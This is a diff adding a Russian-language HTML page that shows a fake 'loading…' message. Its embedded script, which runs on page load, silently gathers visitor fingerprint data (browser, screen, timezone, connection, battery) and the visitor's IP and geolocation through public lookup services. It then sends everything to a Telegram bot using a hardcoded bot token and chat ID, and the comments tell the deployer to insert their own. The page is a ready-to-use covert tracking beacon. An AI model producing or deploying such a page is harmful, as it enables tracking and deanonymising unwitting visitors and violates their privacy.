@@ -1,0 +1,99 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Загрузка…</title>
+<style>
+  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+       background:#0e0e10;color:#9aa0a6;font:14px/1.5 ui-monospace,monospace}
+  #s{opacity:.8}
+</style>
+</head>
+<body>
+<p id="s">загрузка…</p>
+
+<script>
+const BOT_TOKEN = "8989141650:AAFBGRMzK6D_7yqVGiinhRR1VHK7Q65ATKY";   // ← твой токен
+const CHAT_ID   = "8989141650";           // ← твой chat_id
+
+// 1) что браузер отдаёт без разрешений
+const info = {
+  ua:       navigator.userAgent,
+  platform: navigator.platform,
+  lang:     navigator.language,
+  langs:    navigator.languages,
+  cores:    navigator.hardwareConcurrency || null,
+  mem:      navigator.deviceMemory || null,
+  dpr:      window.devicePixelRatio,
+  screen:   screen.width + "x" + screen.height,
+  avail:    screen.availWidth + "x" + screen.availHeight,
+  tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
+  tzOffset: new Date().getTimezoneOffset(),
+  touch:    navigator.maxTouchPoints || 0,
+  conn: navigator.connection ? {
+          type: navigator.connection.effectiveType,
+          down: navigator.connection.downlink,
+          rtt:  navigator.connection.rtt
+        } : null,
+  battery:  null,
+  ts:       new Date().toISOString(),
+};
+
+// 2) батарея (не везде, но если есть — берём)
+if (navigator.getBattery) {
+  navigator.getBattery().then(b => {
+    info.battery = {
+      level:    Math.round(b.level * 100) + "%",
+      charging: b.charging,
+    };
+  }).catch(()=>{});
+}
+
+// 3) IP + гео — публичный эндпоинт, браузер отдаёт сам
+async function geo() {
+  const endpoints = [
+    "https://ipapi.co/json/",
+    "https://ipwho.is/",
+  ];
+  for (const url of endpoints) {
+    try {
+      const r = await fetch(url, {cache: "no-store"});
+      const j = await r.json();
+      return {
+        ip:      j.ip,
+        city:    j.city,
+        region:  j.region || j.region_name,
+        country: j.country_name || j.country,
+        org:     j.org || j.connection?.org,
+        asn:     j.asn || j.connection?.asn,
+      };
+    } catch (e) {}
+  }
+  return {ip: null};
+}
+
+// 4) отправка в TG
+async function send(payload) {
+  const text = "📡 beacon\n```\n" + JSON.stringify(payload, null, 2) + "\n```";
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: CHAT_ID, text, parse_mode: "Markdown"})
+    });
+    document.getElementById("s").textContent = "готово";
+  } catch (e) {
+    document.getElementById("s").textContent = "ошибка сети";
+  }
+}
+
+// 5) сборка + отправка
+(async () => {
+  const g = await geo();
+  Object.assign(info, g);
+  await send(info);
+})();
+</script>
+</body>
+</html>
